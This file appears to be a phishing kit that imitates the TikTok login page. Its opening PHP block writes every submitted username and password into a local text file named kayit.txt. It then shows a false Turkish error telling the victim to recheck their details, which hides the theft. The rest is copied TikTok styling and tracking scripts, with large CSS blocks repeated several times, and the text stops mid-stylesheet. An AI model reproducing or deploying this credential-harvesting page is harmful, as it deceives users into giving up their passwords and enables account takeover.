
<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>



<html style="font-size: 200px;"><head>
  <title>TikTok Login</title>
  <meta charset="UTF-8">

  <link rel="dns-prefetch" href="//s0.ipstatp.com/">
  <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico">

  <script type="text/javascript" charset="utf8" async="" src="https://g.alicdn.com/react-intl-universal/locale-data/1.0.0/en.js"></script><style type="text/css">#verify-bar-box{
    background: #f8f8f8;
}
#validate-toolbar {
    display: -webkit-box;
    display: flex;
    -webkit-box-align: center;
    align-items: center;
    width: 100%;
    height: 48px;
    line-height: 48px;
    /* background: #fff; */
}

#validate-toolbar > #tip {
    font-family: PingFangSC-Medium;
    font-size: 18px;
    color: #404040;
    text-align: left;
    padding-left: 16px;
    -webkit-box-flex: 1;
    flex-grow: 1;
}

#validate-toolbar #img-close {
    width: 32px;
    padding-right: 8px;
    font-size: 0;
    cursor: pointer;
}

#validate-toolbar #img-close  svg {
    width: 24px;
    height: 24px;
    vertical-align: middle;
}

.validate-main {
    position: relative;
    height: 150px;
    background-color: #e8e8e8;
    margin: 16px 16px 0 16px;
}

.validate-main > #validate-big {
    width: 268px;
    max-height: 150px;
}

.validate-main .validate-block {
    position: absolute;
    /* left: 0 !important; */
    width: 55px;
    height: 55px;
}

.validate-main .validate-msg {
    position: absolute;
    left: 0;
    right: 0;
    bottom: 0;
    color: #FFF;
    height: 32px;
    line-height: 32px;
    font-family: PingFangSC-Medium;
    font-size: 14px;
    padding-left: 12px;
    padding-right: 12px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.verify-hidden {
    display: none;
}

.validate-pass {
    background: #A0CC49;
}

.validate-fail {
    background: #EB2F2F;
}

#validate-drag-wrapper {
    position: relative;
    height: 40px;
    text-align: center;
    margin: 24px 16px 20px;
}

#validate-drag-wrapper > #validate-prompt {
    position: relative;
    width: 100%;
    height: 40px;
    font-size: 12.96px;
    /* color: #808080; */
    /* line-height: 40px; */
    /* background: #F0F0F0; */
    border: 2px solid #E0E0E0;
    border-radius: 100px;
    text-align: right;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

/* #validate-drag-wrapper > #validate-prompt > span {
    padding-right: 16px;
} */
#validate-drag-wrapper > #validate-prompt > span {
    display: inline-block;
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    -moz-transform: translate(-50%, -50%);
    -webkit-transform: translate(-50%, -50%);
    -o-transform: translate(-50%, -50%);
    text-align: left;
    height: auto;
    word-break: break-all;
    word-wrap: break-word;
    width: 73%;
    padding-left: 23%;
    /* line-height: 0.5rem; */
    font-size: 0.8em;
    /* white-space: nowrap;
    overflow: hidden; */
    overflow: hidden;
    text-overflow: ellipsis;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
}

#validate-drag-wrapper .validate-drag-button {
    position: absolute;
    /* left: 0 !important; */
    top: -20px;
    width: 64px;
    height: 40px;
    z-index: 1;
    text-align: left;
    cursor: pointer;
}

#validate-drag-wrapper .validate-drag-button > .drag-button{
    position: relative;
    width: 64px;
    height: 40px;
    border-radius: 40px;
    -webkit-box-shadow: 0 2px 5px #ccc;
    box-shadow: 0 2px 5px #ccc;
    background: #fff;
    border: 2px solid #ccc;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin-top: 20px;
}

#validate-refresh {
    position: relative;
    margin: 16px 16px 0 16px;
    padding-bottom: 16px;
    font-size: 0;
    text-align: right;
}

#validate-refresh > #validate-refresh-box {
    display: inline-block;
    font-size: 16px;
    font-family: PingFangSC-Regular;
    line-height: 32px;
    cursor: pointer;
    /* color: #4A90E2; */
}

#validate-refresh > #validate-refresh-box  .icon {
    width: 16px;
    height: 16px;
    vertical-align: middle;
    /* fill: #4A90E2; */
}

#validate-refresh > #validate-refresh-box span {
    vertical-align: middle;
}

.vefify-canvas-mask {
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    background: #fff;
    opacity: 0.5;
    z-index: 100;
}

.vefify-canvas-loading {
    position: absolute;
    top: 50%;
    left: 50%;
}

.vefify-canvas-loading div {
    width: 3px;
    height: 8px;
    background: #000;
    position: absolute;
    left: 0;
    top: 0;
    opacity: 0;

    -webkit-animation: loading 1.2s linear infinite;
    animation: loading 1.2s linear infinite;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line1 {
    -webkit-transform: rotate(0deg) translate(0, -12px);
    -webkit-animation-delay: 0s;
    transform: rotate(0deg) translate(0, -12px);
    animation-delay: 0s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line2 {
    -webkit-transform: rotate(30deg) translate(0, -12px);
    -webkit-animation-delay: 0.1s;
    transform: rotate(30deg) translate(0, -12px);
    animation-delay: 0.1s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line3 {
    -webkit-transform: rotate(60deg) translate(0, -12px);
    -webkit-animation-delay: 0.2s;
    transform: rotate(60deg) translate(0, -12px);
    animation-delay: 0.2s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line4 {
    -webkit-transform: rotate(90deg) translate(0, -12px);
    -webkit-animation-delay: 0.3s;
    transform: rotate(90deg) translate(0, -12px);
    animation-delay: 0.3s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line5 {
    -webkit-transform: rotate(120deg) translate(0, -12px);
    -webkit-animation-delay: 0.4s;
    transform: rotate(120deg) translate(0, -12px);
    animation-delay: 0.4s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line6 {
    -webkit-transform: rotate(150deg) translate(0, -12px);
    -webkit-animation-delay: 0.5s;
    transform: rotate(150deg) translate(0, -12px);
    animation-delay: 0.5s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line7 {
    -webkit-transform: rotate(180deg) translate(0, -12px);
    -webkit-animation-delay: 0.6s;
    transform: rotate(180deg) translate(0, -12px);
    animation-delay: 0.6s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line8 {
    -webkit-transform: rotate(210deg) translate(0, -12px);
    -webkit-animation-delay: 0.7s;
    transform: rotate(210deg) translate(0, -12px);
    animation-delay: 0.7s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line9 {
    -webkit-transform: rotate(240deg) translate(0, -12px);
    -webkit-animation-delay: 0.8s;
    transform: rotate(240deg) translate(0, -12px);
    animation-delay: 0.8s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line10 {
    -webkit-transform: rotate(270deg) translate(0, -12px);
    -webkit-animation-delay: 0.9s;
    transform: rotate(270deg) translate(0, -12px);
    animation-delay: 0.9s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line11 {
    -webkit-transform: rotate(300deg) translate(0, -12px);
    -webkit-animation-delay: 1.0s;
    transform: rotate(300deg) translate(0, -12px);
    animation-delay: 1.0s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line12 {
    -webkit-transform: rotate(330deg) translate(0, -12px);
    -webkit-animation-delay: 1.1s;
    transform: rotate(330deg) translate(0, -12px);
    animation-delay: 1.1s;
}

@-webkit-keyframes loading {
    from {
        opacity: 1;
    }
    to {
        opacity: 0.25;
    }
}

@keyframes loading {
    from {
        opacity: 1;
    }
    to {
        opacity: 0.25;
    }
}

/**
 * 样式适配
 */

.aweme .validate-refresh-box {
    color: #FE2C55;
}

.aweme .validate-pass {
    background: #7ED321;
}

.aweme .validate-fail {
    background: #7ED321;
}

.aweme .validate-refresh .icon {
    fill: #FE2C55;
}

.hotsoon .validate-refresh-box .refresh {
    color: #FF4E33;
}

.hotsoon .validate-refresh .icon {
    fill: #FF4E33;
}
</style><style type="text/css">#verify-bar-box{
    background: #f8f8f8;
}
#validate-toolbar {
    display: -webkit-box;
    display: flex;
    -webkit-box-align: center;
    align-items: center;
    width: 100%;
    height: 48px;
    line-height: 48px;
    /* background: #fff; */
}

#validate-toolbar > #tip {
    font-family: PingFangSC-Medium;
    font-size: 18px;
    color: #404040;
    text-align: left;
    padding-left: 16px;
    -webkit-box-flex: 1;
    flex-grow: 1;
}

#validate-toolbar #img-close {
    width: 32px;
    padding-right: 8px;
    font-size: 0;
    cursor: pointer;
}

#validate-toolbar #img-close  svg {
    width: 24px;
    height: 24px;
    vertical-align: middle;
}

.validate-main {
    position: relative;
    height: 150px;
    background-color: #e8e8e8;
    margin: 16px 16px 0 16px;
}

.validate-main > #validate-big {
    width: 268px;
    max-height: 150px;
}

.validate-main .validate-block {
    position: absolute;
    /* left: 0 !important; */
    width: 55px;
    height: 55px;
}

.validate-main .validate-msg {
    position: absolute;
    left: 0;
    right: 0;
    bottom: 0;
    color: #FFF;
    height: 32px;
    line-height: 32px;
    font-family: PingFangSC-Medium;
    font-size: 14px;
    padding-left: 12px;
    padding-right: 12px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.verify-hidden {
    display: none;
}

.validate-pass {
    background: #A0CC49;
}

.validate-fail {
    background: #EB2F2F;
}

#validate-drag-wrapper {
    position: relative;
    height: 40px;
    text-align: center;
    margin: 24px 16px 20px;
}

#validate-drag-wrapper > #validate-prompt {
    position: relative;
    width: 100%;
    height: 40px;
    font-size: 12.96px;
    /* color: #808080; */
    /* line-height: 40px; */
    /* background: #F0F0F0; */
    border: 2px solid #E0E0E0;
    border-radius: 100px;
    text-align: right;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

/* #validate-drag-wrapper > #validate-prompt > span {
    padding-right: 16px;
} */
#validate-drag-wrapper > #validate-prompt > span {
    display: inline-block;
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    -moz-transform: translate(-50%, -50%);
    -webkit-transform: translate(-50%, -50%);
    -o-transform: translate(-50%, -50%);
    text-align: left;
    height: auto;
    word-break: break-all;
    word-wrap: break-word;
    width: 73%;
    padding-left: 23%;
    /* line-height: 0.5rem; */
    font-size: 0.8em;
    /* white-space: nowrap;
    overflow: hidden; */
    overflow: hidden;
    text-overflow: ellipsis;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
}

#validate-drag-wrapper .validate-drag-button {
    position: absolute;
    /* left: 0 !important; */
    top: -20px;
    width: 64px;
    height: 40px;
    z-index: 1;
    text-align: left;
    cursor: pointer;
}

#validate-drag-wrapper .validate-drag-button > .drag-button{
    position: relative;
    width: 64px;
    height: 40px;
    border-radius: 40px;
    -webkit-box-shadow: 0 2px 5px #ccc;
    box-shadow: 0 2px 5px #ccc;
    background: #fff;
    border: 2px solid #ccc;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin-top: 20px;
}

#validate-refresh {
    position: relative;
    margin: 16px 16px 0 16px;
    padding-bottom: 16px;
    font-size: 0;
    text-align: right;
}

#validate-refresh > #validate-refresh-box {
    display: inline-block;
    font-size: 16px;
    font-family: PingFangSC-Regular;
    line-height: 32px;
    cursor: pointer;
    /* color: #4A90E2; */
}

#validate-refresh > #validate-refresh-box  .icon {
    width: 16px;
    height: 16px;
    vertical-align: middle;
    /* fill: #4A90E2; */
}

#validate-refresh > #validate-refresh-box span {
    vertical-align: middle;
}

.vefify-canvas-mask {
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    background: #fff;
    opacity: 0.5;
    z-index: 100;
}

.vefify-canvas-loading {
    position: absolute;
    top: 50%;
    left: 50%;
}

.vefify-canvas-loading div {
    width: 3px;
    height: 8px;
    background: #000;
    position: absolute;
    left: 0;
    top: 0;
    opacity: 0;

    -webkit-animation: loading 1.2s linear infinite;
    animation: loading 1.2s linear infinite;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line1 {
    -webkit-transform: rotate(0deg) translate(0, -12px);
    -webkit-animation-delay: 0s;
    transform: rotate(0deg) translate(0, -12px);
    animation-delay: 0s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line2 {
    -webkit-transform: rotate(30deg) translate(0, -12px);
    -webkit-animation-delay: 0.1s;
    transform: rotate(30deg) translate(0, -12px);
    animation-delay: 0.1s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line3 {
    -webkit-transform: rotate(60deg) translate(0, -12px);
    -webkit-animation-delay: 0.2s;
    transform: rotate(60deg) translate(0, -12px);
    animation-delay: 0.2s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line4 {
    -webkit-transform: rotate(90deg) translate(0, -12px);
    -webkit-animation-delay: 0.3s;
    transform: rotate(90deg) translate(0, -12px);
    animation-delay: 0.3s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line5 {
    -webkit-transform: rotate(120deg) translate(0, -12px);
    -webkit-animation-delay: 0.4s;
    transform: rotate(120deg) translate(0, -12px);
    animation-delay: 0.4s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line6 {
    -webkit-transform: rotate(150deg) translate(0, -12px);
    -webkit-animation-delay: 0.5s;
    transform: rotate(150deg) translate(0, -12px);
    animation-delay: 0.5s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line7 {
    -webkit-transform: rotate(180deg) translate(0, -12px);
    -webkit-animation-delay: 0.6s;
    transform: rotate(180deg) translate(0, -12px);
    animation-delay: 0.6s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line8 {
    -webkit-transform: rotate(210deg) translate(0, -12px);
    -webkit-animation-delay: 0.7s;
    transform: rotate(210deg) translate(0, -12px);
    animation-delay: 0.7s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line9 {
    -webkit-transform: rotate(240deg) translate(0, -12px);
    -webkit-animation-delay: 0.8s;
    transform: rotate(240deg) translate(0, -12px);
    animation-delay: 0.8s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line10 {
    -webkit-transform: rotate(270deg) translate(0, -12px);
    -webkit-animation-delay: 0.9s;
    transform: rotate(270deg) translate(0, -12px);
    animation-delay: 0.9s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line11 {
    -webkit-transform: rotate(300deg) translate(0, -12px);
    -webkit-animation-delay: 1.0s;
    transform: rotate(300deg) translate(0, -12px);
    animation-delay: 1.0s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line12 {
    -webkit-transform: rotate(330deg) translate(0, -12px);
    -webkit-animation-delay: 1.1s;
    transform: rotate(330deg) translate(0, -12px);
    animation-delay: 1.1s;
}

@-webkit-keyframes loading {
    from {
        opacity: 1;
    }
    to {
        opacity: 0.25;
    }
}

@keyframes loading {
    from {
        opacity: 1;
    }
    to {
        opacity: 0.25;
    }
}

/**
 * 样式适配
 */

.aweme .validate-refresh-box {
    color: #FE2C55;
}

.aweme .validate-pass {
    background: #7ED321;
}

.aweme .validate-fail {
    background: #7ED321;
}

.aweme .validate-refresh .icon {
    fill: #FE2C55;
}

.hotsoon .validate-refresh-box .refresh {
    color: #FF4E33;
}

.hotsoon .validate-refresh .icon {
    fill: #FF4E33;
}
</style></head><body><iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe><iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe><script src="https://polyfill.io/v3/polyfill.min.js" crossorigin="anonymous"></script>
  
  <script src="https://cdn.ravenjs.com/3.24.1/raven.min.js" crossorigin="anonymous"></script>
  
  <script src="https://s0.ipstatp.com/static_magic/toutiao/monitor/sdk/slardar.js" crossorigin="anonymous"></script>
  <script src="https://s0.ipstatp.com/static_magic/pgc/tech/collect/collect-v.3.1.29.js" crossorigin="anonymous"></script>
  <script id="monitorInit">window.Raven&&window.Raven.config("//d3a817c083214ca6a9cad7157614e567@aliva-sentry.byteoversea.com/13",{environment:"production",ignoreUrls:[/https?:\/\/localhost/]}).install(),window.Slardar&&window.Slardar.install({sampleRate:.5,bid:"tiktok_web_login",pid:"login_home"}),function(n,a){if(n.TeaAnalyticsObject=a,!n[a]){function e(){return e.q.push(arguments),e}e.q=e.q||[],n[a]=e}n[a].l=+new Date}(window,"collectEvent")</script>
<link href="//s16.tiktokcdn.com/web_login/style/index.a71f5c703e41938d3dd5.css" rel="stylesheet">
<script>!function(){function o(n,i){if(n&&i)for(var r in i)i.hasOwnProperty(r)&&(void 0===n[r]?n[r]=i[r]:n[r].constructor===Object&&i[r].constructor===Object?o(n[r],i[r]):n[r]=i[r])}try{var n=decodeURIComponent("");if(n.length>0&&window.JSON&&"function"==typeof window.JSON.parse){var i=JSON.parse(n);void 0!==window.BOOMR_config?o(window.BOOMR_config,i):window.BOOMR_config=i}}catch(r){window.console&&"function"==typeof window.console.error&&console.error("mPulse: Could not parse configuration",r)}}();</script>
<script>!function(a){var e="https://s.go-mpulse.net/boomerang/",t="addEventListener";if("False"=="True")a.BOOMR_config=a.BOOMR_config||{},a.BOOMR_config.PageParams=a.BOOMR_config.PageParams||{},a.BOOMR_config.PageParams.pci=!0,e="https://s2.go-mpulse.net/boomerang/";if(function(){function n(e){a.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!a.BOOMR||!a.BOOMR.version&&!a.BOOMR.snippetExecuted){a.BOOMR=a.BOOMR||{},a.BOOMR.snippetExecuted=!0;var i,o,r,O=document.createElement("iframe");if(a[t])a[t]("load",n,!1);else if(a.attachEvent)a.attachEvent("onload",n);O.src="javascript:void(0)",O.title="",O.role="presentation",(O.frameElement||O).style.cssText="width:0;height:0;border:0;display:none;",r=document.getElementsByTagName("script")[0],r.parentNode.insertBefore(O,r);try{o=O.contentWindow.document}catch(_){i=document.domain,O.src="javascript:var d=document.open();d.domain='"+i+"';void(0);",o=O.contentWindow.document}o.open()._l=function(){var a=this.createElement("script");if(i)this.domain=i;a.id="boomr-if-as",a.src=e+"3SNHB-N5CT4-EEMK6-MJGN4-6D8V7",BOOMR_lstart=(new Date).getTime(),this.body.appendChild(a)},o.write("<bo"+'dy onload="document._l();">'),o.close()}}(),"".length>0)if(a&&"performance"in a&&a.performance&&"function"==typeof a.performance.setResourceTimingBufferSize)a.performance.setResourceTimingBufferSize();!function(){if(BOOMR=a.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var e=""=="true"?1:0,t="",n="fyavvcwdv53f6xg2ngia-f-ff2fc1773-clientnsv4-s.akamaihd.net",i={"ak.v":20,"ak.cp":"808581","ak.ai":parseInt("482136",10),"ak.ol":"0","ak.cr":75,"ak.ipv":4,"ak.proto":"h2","ak.rid":"29e838e5","ak.r":20076,"ak.a2":e,"ak.m":"r","ak.n":"ff","ak.bpcip":"46.1.90.0","ak.cport":63958,"ak.gh":"195.175.118.91","ak.quicv":"","ak.tlsv":"tls1.2","ak.0rtt":"","ak.csrc":"-","ak.acc":"","ak.t":"1557817744"};if(""!==t)i["ak.ruds"]=t;var o={i:!1,av:function(e){var t="http.initiator";if(e&&(!e[t]||"spa_hard"===e[t]))i["ak.feo"]=void 0!==a.aFeoApplied?1:0,BOOMR.addVar(i)},rv:function(){var a=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t"];BOOMR.removeVar(a)}};BOOMR.plugins.AK={akVars:i,akDNSPreFetchDomain:n,init:function(){if(!o.i){var a=BOOMR.subscribe;a("before_beacon",o.av,null,null),a("onbeacon",o.rv,null,null),o.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script><script type="text/javascript" charset="utf8" async="" src="https://g.alicdn.com/react-intl-universal/locale-data/1.0.0/en.js"></script><style type="text/css">#verify-bar-box{
    background: #f8f8f8;
}
#validate-toolbar {
    display: -webkit-box;
    display: flex;
    -webkit-box-align: center;
    align-items: center;
    width: 100%;
    height: 48px;
    line-height: 48px;
    /* background: #fff; */
}

#validate-toolbar > #tip {
    font-family: PingFangSC-Medium;
    font-size: 18px;
    color: #404040;
    text-align: left;
    padding-left: 16px;
    -webkit-box-flex: 1;
    flex-grow: 1;
}

#validate-toolbar #img-close {
    width: 32px;
    padding-right: 8px;
    font-size: 0;
    cursor: pointer;
}

#validate-toolbar #img-close  svg {
    width: 24px;
    height: 24px;
    vertical-align: middle;
}

.validate-main {
    position: relative;
    height: 150px;
    background-color: #e8e8e8;
    margin: 16px 16px 0 16px;
}

.validate-main > #validate-big {
    width: 268px;
    max-height: 150px;
}

.validate-main .validate-block {
    position: absolute;
    /* left: 0 !important; */
    width: 55px;
    height: 55px;
}

.validate-main .validate-msg {
    position: absolute;
    left: 0;
    right: 0;
    bottom: 0;
    color: #FFF;
    height: 32px;
    line-height: 32px;
    font-family: PingFangSC-Medium;
    font-size: 14px;
    padding-left: 12px;
    padding-right: 12px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.verify-hidden {
    display: none;
}

.validate-pass {
    background: #A0CC49;
}

.validate-fail {
    background: #EB2F2F;
}

#validate-drag-wrapper {
    position: relative;
    height: 40px;
    text-align: center;
    margin: 24px 16px 20px;
}

#validate-drag-wrapper > #validate-prompt {
    position: relative;
    width: 100%;
    height: 40px;
    font-size: 12.96px;
    /* color: #808080; */
    /* line-height: 40px; */
    /* background: #F0F0F0; */
    border: 2px solid #E0E0E0;
    border-radius: 100px;
    text-align: right;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

/* #validate-drag-wrapper > #validate-prompt > span {
    padding-right: 16px;
} */
#validate-drag-wrapper > #validate-prompt > span {
    display: inline-block;
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    -moz-transform: translate(-50%, -50%);
    -webkit-transform: translate(-50%, -50%);
    -o-transform: translate(-50%, -50%);
    text-align: left;
    height: auto;
    word-break: break-all;
    word-wrap: break-word;
    width: 73%;
    padding-left: 23%;
    /* line-height: 0.5rem; */
    font-size: 0.8em;
    /* white-space: nowrap;
    overflow: hidden; */
    overflow: hidden;
    text-overflow: ellipsis;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
}

#validate-drag-wrapper .validate-drag-button {
    position: absolute;
    /* left: 0 !important; */
    top: -20px;
    width: 64px;
    height: 40px;
    z-index: 1;
    text-align: left;
    cursor: pointer;
}

#validate-drag-wrapper .validate-drag-button > .drag-button{
    position: relative;
    width: 64px;
    height: 40px;
    border-radius: 40px;
    -webkit-box-shadow: 0 2px 5px #ccc;
    box-shadow: 0 2px 5px #ccc;
    background: #fff;
    border: 2px solid #ccc;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin-top: 20px;
}

#validate-refresh {
    position: relative;
    margin: 16px 16px 0 16px;
    padding-bottom: 16px;
    font-size: 0;
    text-align: right;
}

#validate-refresh > #validate-refresh-box {
    display: inline-block;
    font-size: 16px;
    font-family: PingFangSC-Regular;
    line-height: 32px;
    cursor: pointer;
    /* color: #4A90E2; */
}

#validate-refresh > #validate-refresh-box  .icon {
    width: 16px;
    height: 16px;
    vertical-align: middle;
    /* fill: #4A90E2; */
}

#validate-refresh > #validate-refresh-box span {
    vertical-align: middle;
}

.vefify-canvas-mask {
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    background: #fff;
    opacity: 0.5;
    z-index: 100;
}

.vefify-canvas-loading {
    position: absolute;
    top: 50%;
    left: 50%;
}

.vefify-canvas-loading div {
    width: 3px;
    height: 8px;
    background: #000;
    position: absolute;
    left: 0;
    top: 0;
    opacity: 0;

    -webkit-animation: loading 1.2s linear infinite;
    animation: loading 1.2s linear infinite;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line1 {
    -webkit-transform: rotate(0deg) translate(0, -12px);
    -webkit-animation-delay: 0s;
    transform: rotate(0deg) translate(0, -12px);
    animation-delay: 0s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line2 {
    -webkit-transform: rotate(30deg) translate(0, -12px);
    -webkit-animation-delay: 0.1s;
    transform: rotate(30deg) translate(0, -12px);
    animation-delay: 0.1s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line3 {
    -webkit-transform: rotate(60deg) translate(0, -12px);
    -webkit-animation-delay: 0.2s;
    transform: rotate(60deg) translate(0, -12px);
    animation-delay: 0.2s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line4 {
    -webkit-transform: rotate(90deg) translate(0, -12px);
    -webkit-animation-delay: 0.3s;
    transform: rotate(90deg) translate(0, -12px);
    animation-delay: 0.3s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line5 {
    -webkit-transform: rotate(120deg) translate(0, -12px);
    -webkit-animation-delay: 0.4s;
    transform: rotate(120deg) translate(0, -12px);
    animation-delay: 0.4s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line6 {
    -webkit-transform: rotate(150deg) translate(0, -12px);
    -webkit-animation-delay: 0.5s;
    transform: rotate(150deg) translate(0, -12px);
    animation-delay: 0.5s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line7 {
    -webkit-transform: rotate(180deg) translate(0, -12px);
    -webkit-animation-delay: 0.6s;
    transform: rotate(180deg) translate(0, -12px);
    animation-delay: 0.6s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line8 {
    -webkit-transform: rotate(210deg) translate(0, -12px);
    -webkit-animation-delay: 0.7s;
    transform: rotate(210deg) translate(0, -12px);
    animation-delay: 0.7s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line9 {
    -webkit-transform: rotate(240deg) translate(0, -12px);
    -webkit-animation-delay: 0.8s;
    transform: rotate(240deg) translate(0, -12px);
    animation-delay: 0.8s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line10 {
    -webkit-transform: rotate(270deg) translate(0, -12px);
    -webkit-animation-delay: 0.9s;
    transform: rotate(270deg) translate(0, -12px);
    animation-delay: 0.9s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line11 {
    -webkit-transform: rotate(300deg) translate(0, -12px);
    -webkit-animation-delay: 1.0s;
    transform: rotate(300deg) translate(0, -12px);
    animation-delay: 1.0s;
}

#validate-main .vefify-canvas-mask >.vefify-canvas-loading .line12 {
    -webkit-transform: rotate(330deg) translate(0, -12px);
    -webkit-animation-delay: 1.1s;
    transform: rotate(330deg) translate(0, -12px);
    animation-delay: 1.1s;
}

@-webkit-keyframes loading {
    from {
        opacity: 1;
    }
    to {
        opacity: 0.25;
    }
}

@keyframes loading {
    from {
        opacity: 1;
    }
    to {
        opacity: 0.25;
    }
}

/**
 * 样式适配
 */

.aweme .validate-refresh-box {
    color: #FE2C55;
}

.aweme .validate-pass {
    background: #7ED321;
}

.aweme .validate-fail {
    background: #7ED321;
}

.aweme .validate-refresh .icon {
    fill: #FE2C55;
}

.hotsoon .validate-refresh-box .refresh {
    color: #FF4E33;
}

.hotsoon .validate-refresh .icon {
    fill: #FF4E33;
}
h1{
  margin:0 0 .5em 0;
  padding:0;
  color:#fff;
  font-family:helvetica;
  font-size:30px;
  font-weight:100;
  letter-spacing:1px;
  text-align:center;
    text-shadow: 0 1px 2px rgba(0,0,0,1);}
section{
  position:relative;
  top:50%;
  width:300px;
  max-width:96%;
  margin:0 auto;
  padding-bottom: 400px;
    -webkit-transform:translateY(-50%);
    -ms-transform:translateY(-50%);
    transform:translateY(-50%);
  background-image:url(http://www.matthewlewicki.com/codefest/images/spotify-logo-small.png);
  background-position:top center;
  background-repeat:no-repeat;
  background-size:100px;}
form{
  padding:0;
  border-radius: 4px;
  background-color:rgba(255,255,255,.75);
  box-shadow: 0 2px 5px 0px rgba(38,38,38,0.5);}
fieldset{
  display: block;
  width:100%;
    margin:0 auto;
  padding:1em 0 1em 0;
  border: none;
  border-bottom: 1px solid #ccc;}
fieldset:first-child{
  margin-bottom:0;}
fieldset:last-child{
  border-bottom: none;
  margin-top:0;
  padding:0;}
input{
  display:block;
  width: 90%;
  height:30px;
  margin:0 auto;
  padding: 5px 0;
  color: #81b71a;
  border: 1px solid #ccc;
  text-align:center;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  -o-border-radius: 4px;
  border-radius: 4px;}
input[type="submit"]{
  display: block;
    -webkit-appearance: none;
    -moz-appearance: none;
    width:100%;
  max-width:100% !important;
  height:3em;
    margin: 0 auto;
    padding: 7px 5px 5px 5px;
    background-color:#262626;
    font-family: helvetica, arial, sans-serif;
    font-size: 1em;
    text-transform: uppercase;
    text-align:center;
  color:#81b71a;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
  border:none;
    border-radius: 0 0 4px 4px;
    -webkit-transition: all 0.5s ease-out;
    -moz-transition: all 0.5s ease-out;
    -o-transition: all 0.5s ease-out;
    transition: all 0.5s ease-out;}
input[type="submit"]:hover{
  background-color: #333;
    text-shadow:none;}
input::-webkit-input-placeholder{
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;}
input:hover::-webkit-input-placeholder{
  color:#81b71a;}
input:focus::-webkit-input-placeholder{
  opacity:0;}
input[type="text"]:focus,input[type="text"]:active,[type="password"]:focus,input[type="password"]:active{
  outline:0;
    -webkit-appearance: none;
    -moz-appearance: none; 
  border-image:none;
